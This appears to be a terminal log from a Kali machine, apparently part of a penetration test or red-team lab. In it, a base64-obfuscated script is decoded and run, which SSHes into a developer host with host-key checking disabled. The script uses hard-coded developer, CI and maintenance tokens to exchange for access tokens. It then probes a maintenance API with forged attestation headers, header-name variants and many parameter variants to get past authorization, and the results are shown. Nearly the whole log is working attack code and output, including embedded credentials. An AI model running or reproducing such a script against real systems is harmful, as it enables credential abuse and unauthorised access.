@@ -1,0 +1,201 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r32.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpFSj0kKGN1cmwgLXNTayAtbSAxMCAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQi9hcGkvdG9rZW4tZXhjaGFuZ2UvZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3MiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKUkM9ImZrX21haW50ZW5hbmNlX3J1bnRpbWVfM2dJUDNqOHc2ZmhrQlNxdjdKNXhsbE9yRFZhMkt6aWciCldDPSJma19jaV9tYWludGVuYW5jZV9uVTdWM0RPbnE3a3B5QXdwNDZjVjUwbU84ZnF0eEhTSiIKTT0iJEIvYXBpL21haW50ZW5hbmNlL01BSU5ULUZMSy0wMSIKZygpeyBuPSIkMSI7IHNoaWZ0OyBlY2hvICIjIyMjIyAkbiI7IGN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRAIiB8IGhlYWQgLWMgMjUwMDsgZWNobzsgfQplY2hvICIjIyMjIyMjIyMjIE1BSU5ULUZMSy0wMSBxdWVyeSIKZm9yIHEgaW4gImFyY2hpdmU9RklFTEQtQ1JSLTIwMjYtMDkiICJhc3NldD1DUlItT0cyIiAiY29tbWFuZD1tYWludGVuYW5jZS1zdW1tYXJ5IiAiY29tbWFuZD1tYWludGVuYW5jZS1zdW1tYXJ5JmFyY2hpdmU9RklFTEQtQ1JSLTIwMjYtMDkiICJhY3Rpb249bWFpbnRlbmFuY2Utc3VtbWFyeSZhcmNoaXZlPUZJRUxELUNSUi0yMDI2LTA5IiAic3VtbWFyeT0xIiAicnVuPTEiOyBkbwogZyAiR0VUID8kcSIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiICIkTT8kcSIKZG9uZQplY2hvICIjIyMjIyMjIyMjIE1BSU5ULUZMSy0wMSBzdWJwYXRocyIKZm9yIHAgaW4gImFyY2hpdmUiICJhcmNoaXZlL0ZJRUxELUNSUi0yMDI2LTA5IiAiYXJjaGl2ZXMvRklFTEQtQ1JSLTIwMjYtMDkiICJhc3NldHMvQ1JSLU9HMiIgInN1bW1hcnkiICJydW4iICJydW5zIiAibWFpbnRlbmFuY2Utc3VtbWFyeSIgIkZJRUxELUNSUi0yMDI2LTA5IjsgZG8KIGcgIkdFVCAvJHAiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAiJE0vJHAiCmRvbmUKZWNobyAiIyMjIyMjIyMjIyBNQUlOVC1GTEstMDEgUE9TVCIKZm9yIGJvZHkgaW4gJ3t9JyAneyJhcmNoaXZlIjoiRklFTEQtQ1JSLTIwMjYtMDkifScgJ3siYXNzZXQiOiJDUlItT0cyIn0nICd7ImNvbW1hbmQiOiJtYWludGVuYW5jZS1zdW1tYXJ5IiwiYXJjaGl2ZSI6IkZJRUxELUNSUi0yMDI2LTA5In0nICd7ImNvbW1hbmQiOlsibWFpbnRlbmFuY2Utc3VtbWFyeSIsIi0tYXJjaGl2ZSIsIkZJRUxELUNSUi0yMDI2LTA5Il19JyAneyJhY3Rpb24iOiJhcmNoaXZlIiwiYXJjaGl2ZSI6IkZJRUxELUNSUi0yMDI2LTA5In0nOyBkbwogZyAiUE9TVCAkYm9keSIgLVggUE9TVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgIiRib2R5IiAiJE0iCmRvbmUKZWNobyAiIyMjIyMjIyMjIyBXSVRIIHNjaGVkdWxlciBhdHRlc3RhdGlvbiB2YXJpYW50cyIKZm9yIEEgaW4gIiRXQyIgIiRSQyIgIiRFSiIgImZpZWxka2VzdC1zY2hlZHVsZXIiICJzdmMtZmllbGRrZXN0LXJ1bm5lciI7IGRvCiBnICJHRVQgP2FyY2hpdmUgV0wgQVQ9JHtBOjA6MTJ9IiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgLUggIlgtV29ya2xvYWQtQ2xhc3M6IG1haW50ZW5hbmNlIiAtSCAiWC1TY2hlZHVsZXItQXR0ZXN0YXRpb246ICRBIiAiJE0/YXJjaGl2ZT1GSUVMRC1DUlItMjAyNi0wOSIKIGcgIlBPU1QgYXJjaGl2ZSBBVD0ke0E6MDoxMn0iIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkQSIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3siYXJjaGl2ZSI6IkZJRUxELUNSUi0yMDI2LTA5IiwiYXNzZXQiOiJDUlItT0cyIiwiY29tbWFuZCI6Im1haW50ZW5hbmNlLXN1bW1hcnkifScgIiRNIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgaGVhZGVyIG5hbWUgdmFyaWFudHMiCmZvciBIIGluICJYLVNjaGVkdWxlci1BdHRlc3RhdGlvbiIgIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uLVRva2VuIiAiWC1BdHRlc3RhdGlvbiIgIlgtTWFpbnRlbmFuY2UtQXR0ZXN0YXRpb24iICJTY2hlZHVsZXItQXR0ZXN0YXRpb24iOyBkbwogZyAiUE9TVCBIPSRIIiAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiIC1IICIkSDogJFdDIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAneyJhcmNoaXZlIjoiRklFTEQtQ1JSLTIwMjYtMDkifScgIiRNIgpkb25lCmVjaG8gRE9ORV9SMzIKUlNICmVjaG8gRklOSVNIRUQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r32.sh; bash /tmp/k14_r32.sh; echo DONEMARK_1795208662368$((6*7))
+########## MAINT-FLK-01 query
+##### GET ?archive=FIELD-CRR-2026-09
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?asset=CRR-OG2
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?command=maintenance-summary
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?command=maintenance-summary&archive=FIELD-CRR-2026-09
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?action=maintenance-summary&archive=FIELD-CRR-2026-09
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?summary=1
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### GET ?run=1
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+########## MAINT-FLK-01 subpaths
+##### GET /archive
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /archive/FIELD-CRR-2026-09
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /archives/FIELD-CRR-2026-09
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /assets/CRR-OG2
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /summary
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /run
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /runs
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /maintenance-summary
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET /FIELD-CRR-2026-09
+{"error":"out_of_scope_workload"}
+
+[403]
+
+########## MAINT-FLK-01 POST
+##### POST {}
+{"error":"authentication_required"}
+
+[401]
+
+##### POST {"archive":"FIELD-CRR-2026-09"}
+{"error":"authentication_required"}
+
+[401]
+
+##### POST {"asset":"CRR-OG2"}
+{"error":"authentication_required"}
+
+[401]
+
+##### POST {"command":"maintenance-summary","archive":"FIELD-CRR-2026-09"}
+{"error":"authentication_required"}
+
+[401]
+
+##### POST {"command":["maintenance-summary","--archive","FIELD-CRR-2026-09"]}
+{"error":"authentication_required"}
+
+[401]
+
+##### POST {"action":"archive","archive":"FIELD-CRR-2026-09"}
+{"error":"authentication_required"}
+
+[401]
+
+########## WITH scheduler attestation variants
+##### GET ?archive WL AT=fk_ci_mainte
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### POST archive AT=fk_ci_mainte
+{"error":"authentication_required"}
+
+[401]
+
+##### GET ?archive WL AT=fk_maintenan
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### POST archive AT=fk_maintenan
+{"error":"authentication_required"}
+
+[401]
+
+##### GET ?archive WL AT=eyJhbGciOiJS
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### POST archive AT=eyJhbGciOiJS
+{"error":"authentication_required"}
+
+[401]
+
+##### GET ?archive WL AT=fieldkest-sc
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### POST archive AT=fieldkest-sc
+{"error":"authentication_required"}
+
+[401]
+
+##### GET ?archive WL AT=svc-fieldkes
+{"label_check":"passed","management_caller":"svc-fieldkest-runner","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### POST archive AT=svc-fieldkes
+{"error":"authentication_required"}
+
+[401]
+
+########## header name variants
+##### POST H=X-Scheduler-Attestation
+{"error":"authentication_required"}
+
+[401]
+
+##### POST H=X-Scheduler-Attestation-Token
+{"error":"authentication_required"}
+
+[401]
+
+##### POST H=X-Attestation
+{"error":"authentication_required"}
+
+[401]
+
+##### POST H=X-Maintenance-Attestation
+{"error":"authentication_required"}
+
+[401]
+
+##### POST H=Scheduler-Attestation
+{"error":"authentication_required"}
+
+[401]
+
+DONE_R32
+FINISHED
